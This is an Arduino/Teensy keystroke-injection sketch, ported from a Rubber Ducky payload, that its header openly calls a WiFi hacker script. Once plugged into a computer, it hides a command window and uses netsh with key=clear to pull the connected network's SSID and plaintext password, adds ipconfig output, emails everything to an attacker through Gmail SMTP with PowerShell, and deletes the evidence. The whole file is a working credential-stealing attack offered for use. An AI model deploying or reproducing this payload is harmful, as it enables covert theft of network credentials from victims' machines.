/*
 * WiFi Hacker Script for Teensy. Adapted for Teensy by B3H1NDu / Keith Anderson
 * 
 * This script finds the network information for the WiFi network the computer
 * is currently connected to. The script opens up a CMD window and hides it at 
 * the bottom of the user's screen, with varying degrees of success from computer
 * to computer and run to run. The script then steals the SSID, Password, Network Type, and
 * Authentication and puts it into a text file on the victim's desktop. The script
 * then proceeds to exfiltrate the data contained in this file via email. A gmail
 * account is necessary for this step, however you may modify the script to accept
 * other email types. After this the script deletes the text file and closes the cmd
 * window, leaving no trace (unless you check the recycle bin.)
 * 
 * In order to use, press ctrl+f and search "REPLACE". Replace "REPLACEUSER"
 * with your Gmail username and "REPLACEPASS" with your gmail password.
 * "REPLACEFROM" is the email you want to send your email from, I recommend
 * you have it as the Gmail address you used in the "REPLACEUSER" field.
 * "REPLACETO" is the email you want to send the email to.
 * 
 * YOU MAY NEED TO ADJUST DELAYS FOR SLOWER COMPUTERS!
 * 
 * This should work on most, if not all Teensys/Arduinos/DigiSparks, 
 * as long as they have HID capabilities. This script has been ported 
 * over from the USB Rubber Ducky Wiki, but it took a lot more work 
 * than I thought it would because of problems with having quotation 
 * marks in the commands. I now realise that my workaround could 
 * have been much more elegant and simple, but I cannot be bothered 
 * fixing it now.
 */

#include <paensy.h>

void setup() {
  
  // Configure the delay that everything else scales off of.
  SetDelay(200);
  // Configure the delay that the Morse code uses.
  SetMorseDelay(250);
  
  // Perform an initial delay to give the USB time to prepare.
  PerformInitDelay();
  
  // LED pin number, 13 for 3.1
  // 11 for 2 and 2.x
  SetLEDPin(13);
  // Put the pin into output mode
  pinMode(LED_PIN, OUTPUT);
  // Turn on the LED pin so we know the device is running.
  digitalWrite(LED_PIN, HIGH);
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1(KEY_D);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);
  RunCommand("cmd");
  delay(500);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_SPACE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(100);
  PressKey(KEY_M, 1);
  delay(500);
  PressKey(KEY_DOWN, 100);
  PressKey(KEY_ENTER, 1);

  
  Keyboard.print("cd ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print("%USERPROFILE%");
  Keyboard.set_key1(KEY_BACKSLASH);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print("Desktop");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print(" & for /f ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print("tokens=2 delims=: ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print(" %A in ('netsh wlan show interface ^| findstr ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print("SSID");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print(" ^| findstr /v ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print("BSSID");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print("') do set A=%A");
  PressKey(KEY_ENTER, 1);

  
  Keyboard.print("netsh wlan show profiles %A% key=clear | findstr /c:");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print("Network type");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print(" /c:");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print("Authentication");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print(" /c:");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print("Key Content");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print(" | findstr /v ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print("broadcast");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print(" | findstr /v ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print("Radio");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print(">>A.txt");
  PressKey(KEY_ENTER, 1);

  
  Keyboard.print("for /f ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print("tokens=3 delims=: ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print(" %A in ('findstr ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print("Network type");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print(" A.txt') do set B=%A");
  PressKey(KEY_ENTER, 1);

  Keyboard.print("for /f ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print("tokens=2 delims=: ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print(" %A in ('findstr ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print("Authentication");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print(" A.txt') do set C=%A");
  PressKey(KEY_ENTER, 1);

  Keyboard.print("for /f ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print("tokens=3 delims=: ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print(" %A in ('findstr ");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print("Key Content");
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_QUOTE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.print(" A.txt') do set D=%A");
  PressKey(KEY_ENTER, 1);

  
  Keyboard.print("del A.txt");
  PressKey(KEY_ENTER, 1);

  
  Keyboard.print("echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt");
  PressKey(KEY_ENTER, 1);

  Keyboard.print("ipconfig /all>>Log.txt");
  PressKey(KEY_ENTER, 1);
  
  Keyboard.print("powershell");
  PressKey(KEY_ENTER, 1);
  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
  PressKey(KEY_ENTER, 1);
  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
  PressKey(KEY_ENTER, 1);
  Keyboard.print("$SMTPInfo.EnableSsl = $true");
  PressKey(KEY_ENTER, 1);
  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('REPLACEUSER', 'REPLACEPASS')");
  PressKey(KEY_ENTER, 1);
  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
  PressKey(KEY_ENTER, 1);
  Keyboard.print("$ReportEmail.From = 'REPLACEFROM'");
  PressKey(KEY_ENTER, 1);
  Keyboard.print("$ReportEmail.To.Add('REPLACETO')");
  PressKey(KEY_ENTER, 1);
  Keyboard.print("$ReportEmail.Subject = 'WiFi key grabber'");
  PressKey(KEY_ENTER, 1);
  Keyboard.print("$ReportEmail.Body = (Get-Content Log.txt | out-string)");
  PressKey(KEY_ENTER, 1);  
  Keyboard.print("$SMTPInfo.Send($ReportEmail)");
  PressKey(KEY_ENTER, 1); 
  delay(5000); 
  Keyboard.print("exit");
  PressKey(KEY_ENTER, 1);  
  delay(3000);
  Keyboard.print("del Log.txt & exit");
  PressKey(KEY_ENTER, 1);  
}

void loop() {
 // Celebratory LED fluttering.
 LED_Flutter(200, 10);
 
 // P
 LED_MorseDot();
 LED_MorseDash();
 LED_MorseDash();
 LED_MorseDot();
 
 // W
 LED_MorseDot();
 LED_MorseDash();
 LED_MorseDash();
 
 // N
 LED_MorseDash();
 LED_MorseDot();

 // 3
 LED_MorseDot();
 LED_MorseDot();
 LED_MorseDot();
 LED_MorseDash();
 LED_MorseDash();
 
 // D
 LED_MorseDash();
 LED_MorseDot();
 LED_MorseDot();
 
 // Flutter again.
 LED_Flutter(200, 10); 
}
